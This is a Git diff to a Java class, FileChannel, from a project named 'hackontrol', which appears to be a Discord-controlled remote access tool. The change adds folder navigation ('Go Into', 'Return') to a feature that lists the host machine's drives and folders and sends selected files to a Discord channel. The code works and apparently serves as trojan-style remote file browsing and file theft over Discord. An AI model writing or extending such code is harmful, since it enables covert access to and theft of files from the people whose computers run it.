@@ -5,17 +5,20 @@ import java.io.File;
 import java.io.StringReader;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Stack;
 
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
+import com.khopan.hackontrol.manager.common.IReplyHandler;
 import com.khopan.hackontrol.manager.modal.ModalContext;
 import com.khopan.hackontrol.manager.modal.ModalManager;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.ErrorUtils;
 
-import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
+import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
+import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
@@ -30,13 +33,19 @@ public class FileChannel extends HackontrolChannel {
 
 	private static final String QUERY_FILE_BUTTON_IDENTIFIER = "queryFile";
 	private static final String VIEW_FILE_MODAL_IDENTIFIER = "viewFile";
+	private static final String GO_INTO_MODAL_IDENTIFIER = "goInto";
 
 	private final List<FileEntry> fileList;
+	private final Stack<File> directoryStack;
 
 	private File filePointer;
+	private ButtonContext goIntoContext;
+	private int startFolder;
+	private int endFolder;
 
 	public FileChannel() {
 		this.fileList = new ArrayList<>();
+		this.directoryStack = new Stack<>();
 	}
 
 	@Override
@@ -51,17 +60,124 @@ public class FileChannel extends HackontrolChannel {
 
 	@Override
 	public void register(Registry registry) {
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.QUERY_FILE_BUTTON_IDENTIFIER, this :: query);
-		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.VIEW_FILE_MODAL_IDENTIFIER, this :: modalCallback);
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.QUERY_FILE_BUTTON_IDENTIFIER, context -> {
+			this.filePointer = null;
+			this.directoryStack.clear();
+			this.queryFile(context, context.getChannel());
+		});
+
+		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.VIEW_FILE_MODAL_IDENTIFIER, this :: modalCallbackViewFile);
+		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.GO_INTO_MODAL_IDENTIFIER, this :: modalCallbackGoInto);
 	}
 
-	private void query(ButtonContext context) {
-		this.filePointer = new File("C:\\Windows");
+	private void goInto(ButtonContext context) {
+		this.goIntoContext = context;
+		this.modal(context, FileChannel.GO_INTO_MODAL_IDENTIFIER, "Go Into", this.startFolder, this.endFolder);
+	}
+
+	private void returnCallback(ButtonContext context) {
+		if(this.directoryStack.isEmpty()) {
+			ErrorUtils.sendErrorReply(context, new InternalError("Stack is empty"));
+			return;
+		}
+
+		File lastItem = this.directoryStack.pop();
+		this.filePointer = lastItem;
+		this.queryFile(context, context.getChannel());
+		context.getChannel().deleteMessageById(context.getEvent().getMessageIdLong()).queue();
+		ButtonManager.deleteMessagesInParameters(context);
+	}
+
+	private void modalCallbackViewFile(ModalContext context) {
+		int index = this.checkModalCallback(context, 1, this.fileList.size());
+
+		if(index < 1) {
+			return;
+		}
+
+		FileEntry entry = this.fileList.get(index - 1);
+		FileEmbedSender.reply(entry.file, context.getEvent());
+	}
+
+	private void modalCallbackGoInto(ModalContext context) {
+		int index = this.checkModalCallback(context, this.startFolder, this.endFolder);
+
+		if(index < 1) {
+			return;
+		}
+
+		FileEntry entry = this.fileList.get(index - 1);
+		this.directoryStack.push(this.filePointer);
+		this.filePointer = entry.file;
+		this.queryFile(context, context.getEvent().getChannel());
+
+		if(this.goIntoContext != null) {
+			this.goIntoContext.getChannel().deleteMessageById(this.goIntoContext.getEvent().getMessageIdLong()).queue();
+			ButtonManager.deleteMessagesInParameters(this.goIntoContext);
+		}
+	}
+
+	private int checkModalCallback(ModalContext context, int start, int end) {
+		ModalMapping mapping = context.value("fileIndex");
+
+		if(mapping == null) {
+			ErrorUtils.sendErrorReply(context, new InternalError("File index cannot be null"));
+			return -1;
+		}
+
+		String text = mapping.getAsString();
+		int index;
+
+		try {
+			index = Integer.parseInt(text);
+		} catch(Throwable Errors) {
+			context.reply("Invalid number format").addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
+			return -1;
+		}
+
+		if(index < start || index > end) {
+			context.reply("Index " + index + " out of bounds, expected " + start + " - " + end).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
+			return -1;
+		}
+
+		return index;
+	}
+
+	private void modal(ButtonContext context, String identifier, String name, int start, int end) {
+		TextInput textInput = TextInput.create("fileIndex", "File Index", TextInputStyle.SHORT)
+				.setRequired(true)
+				.setMinLength(Integer.toString(start).length())
+				.setMaxLength(Integer.toString(end).length())
+				.setPlaceholder(start + " - " + end)
+				.build();
+
+		Modal modal = Modal.create(identifier, name)
+				.addActionRow(textInput)
+				.build();
+
+		context.replyModal(modal).queue();
+	}
+
+	private void configActionRow(MessageCreateRequest<?> request, boolean root, Object... messageIdentifiers) {
+		List<ItemComponent> list = new ArrayList<>();
+		list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "View", context -> this.modal(context, FileChannel.VIEW_FILE_MODAL_IDENTIFIER, "View File", 1, this.fileList.size())));
+		list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Go Into", this :: goInto, messageIdentifiers));
+
+		if(!root) {
+			list.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Return", this :: returnCallback, messageIdentifiers));
+		}
+
+		list.add(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", messageIdentifiers));
+		request.addActionRow(list);
+	}
+
+	private void queryFile(IReplyHandler handler, MessageChannel channel) {
 		StringBuilder builder = new StringBuilder();
-		File[] files = this.filePointer == null ? File.listRoots() : this.filePointer.listFiles();
+		boolean root = this.filePointer == null;
+		File[] files = root ? File.listRoots() : this.filePointer.listFiles();
 
 		if(files == null || files.length == 0) {
-			ErrorUtils.sendErrorReply(context, new InternalError("Empty file list"));
+			ErrorUtils.sendErrorReply(handler, new InternalError("Empty file list"));
 			return;
 		}
 
@@ -85,13 +201,13 @@ public class FileChannel extends HackontrolChannel {
 		}
 
 		if(fileList.isEmpty() && folderList.isEmpty()) {
-			ErrorUtils.sendErrorReply(context, new InternalError("No files available"));
+			ErrorUtils.sendErrorReply(handler, new InternalError("No files available"));
 			return;
 		}
 
 		int ordinal = 1;
 		builder.append("**");
-		builder.append(this.filePointer == null ? "SYSTEMROOT" : this.filePointer.getAbsolutePath().replace("\\", "\\\\"));
+		builder.append(root ? "SYSTEMROOT" : this.filePointer.getAbsolutePath().replace("\\", "\\\\"));
 		builder.append("**");
 		this.fileList.clear();
 
@@ -106,15 +222,22 @@ public class FileChannel extends HackontrolChannel {
 				builder.append('\n');
 				builder.append(entry.ordinal);
 				builder.append(") `");
-				builder.append(entry.file.getName());
+				builder.append(root ? entry.file.getAbsolutePath() : entry.file.getName());
 				builder.append('`');
 			}
 		}
 
 		if(!folderList.isEmpty()) {
 			builder.append("\n**Folder**");
+			int size = folderList.size();
 
-			for(int i = 0; i < folderList.size(); i++) {
+			for(int i = 0; i < size; i++) {
+				if(i == 0) {
+					this.startFolder = ordinal;
+				} else if(i == size - 1) {
+					this.endFolder = ordinal;
+				}
+
 				FileEntry entry = new FileEntry();
 				entry.ordinal = ordinal++;
 				entry.file = folderList.get(i);
@@ -122,7 +245,7 @@ public class FileChannel extends HackontrolChannel {
 				builder.append('\n');
 				builder.append(entry.ordinal);
 				builder.append(") `");
-				builder.append(entry.file.getName());
+				builder.append(root ? entry.file.getAbsolutePath() : entry.file.getName());
 				builder.append('`');
 			}
 		}
@@ -148,17 +271,16 @@ public class FileChannel extends HackontrolChannel {
 				messageList.add(builder.toString());
 			}
 		} catch(Throwable Errors) {
-			ErrorUtils.sendErrorReply(context, Errors);
+			ErrorUtils.sendErrorReply(handler, Errors);
 			return;
 		}
 
-		MessageChannelUnion channel = context.getChannel();
 		String firstBatch = messageList.get(0);
 		messageList.remove(0);
-		ReplyCallbackAction replyCallbackAction = context.reply(firstBatch);
+		ReplyCallbackAction replyCallbackAction = handler.reply(firstBatch);
 
 		if(messageList.isEmpty()) {
-			this.configActionRow(replyCallbackAction);
+			this.configActionRow(replyCallbackAction, root);
 			replyCallbackAction.queue(ButtonManager :: dynamicButtonCallback);
 			return;
 		}
@@ -171,7 +293,7 @@ public class FileChannel extends HackontrolChannel {
 
 				if(size == 1) {
 					messageCreateAction = channel.sendMessage(messageList.get(0));
-					this.configActionRow(messageCreateAction, message.getIdLong());
+					this.configActionRow(messageCreateAction, root, message.getIdLong());
 				} else {
 					Object[] identifierList = new Object[size];
 					identifierList[0] = message.getIdLong();
@@ -181,70 +303,12 @@ public class FileChannel extends HackontrolChannel {
 					}
 
 					messageCreateAction = channel.sendMessage(messageList.get(size - 1));
-					this.configActionRow(messageCreateAction, identifierList);
+					this.configActionRow(messageCreateAction, root, identifierList);
 				}
 
 				messageCreateAction.queue(ButtonManager :: dynamicButtonCallback);
 			}).start());
 		});
-	}
-
-	private void configActionRow(MessageCreateRequest<?> request, Object... messageIdentifiers) {
-		request.addActionRow(
-				ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "View", this :: view),
-				ButtonManager.dynamicButton(ButtonStyle.PRIMARY, "Go Inside", this :: goInside),
-				ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", messageIdentifiers)
-				);
-	}
-
-	private void goInside(ButtonContext context) {
-		context.acknowledge();
-	}
-
-	private void view(ButtonContext context) {
-		int size = this.fileList.size();
-		TextInput textInput = TextInput.create("fileIndex", "File Index", TextInputStyle.SHORT)
-				.setPlaceholder("File Index")
-				.setRequired(true)
-				.setMinLength(0)
-				.setMaxLength(Integer.toString(size).length())
-				.setPlaceholder("1 - " + size)
-				.build();
-
-		Modal modal = Modal.create(FileChannel.VIEW_FILE_MODAL_IDENTIFIER, "View File")
-				.addActionRow(textInput)
-				.build();
-
-		context.replyModal(modal).queue();
-	}
-
-	private void modalCallback(ModalContext context) {
-		ModalMapping mapping = context.value("fileIndex");
-
-		if(mapping == null) {
-			ErrorUtils.sendErrorReply(context, new InternalError("File index cannot be null"));
-			return;
-		}
-
-		String text = mapping.getAsString();
-		int index;
-
-		try {
-			index = Integer.parseInt(text);
-		} catch(Throwable Errors) {
-			context.reply("Invalid number format").addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
-			return;
-		}
-
-		int size = this.fileList.size();
-
-		if(index > size) {
-			context.reply("Index " + index + " out of bounds, expected 1 - " + size).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
-			return;
-		}
-
-		FileEntry entry = this.fileList.get(index - 1);
-		FileEmbedSender.reply(entry.file, context.getEvent());
 	}
 
 	private static class FileEntry {
